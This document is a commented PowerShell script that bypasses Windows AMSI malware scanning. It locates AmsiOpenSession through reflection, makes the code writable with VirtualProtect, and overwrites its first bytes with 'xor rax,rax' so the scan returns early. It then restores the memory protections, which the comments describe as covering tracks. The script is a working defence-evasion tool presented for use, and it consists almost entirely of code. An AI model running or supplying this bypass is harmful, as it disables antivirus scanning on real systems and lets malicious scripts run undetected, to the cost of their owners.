function LookUpFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {If ($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))

}
#obtain the address of the AmsiOpenSession function in our process memory using reflection to load the AMSI.dll module
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$funcAddr

function getDelegateType{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDOmain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime,Managed')
    $type.DefineMethod('Invoke','Public, HideBySig, NewSlot, Virtual',$delType, $func).SetImplementationFlags('Runtime,Managed')
    return $type.CreateType()
}

#then we change the memory protections of the AmsiOpenSession function using relfection again to load the Virtualprotect win32 API & specifying the type of arguments the function will receive by creating a getDelegate type for it.
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

#next we create a buffer of bytes that equates to xor rax,rax which will set the zero flag and force the AmsiOpenSession to immediately jump to our return statement.
$buf_byte = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf_byte, 0, $funcAddr, 3)
#finally, we revert the memory protections back to original state to cover our tracks.
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
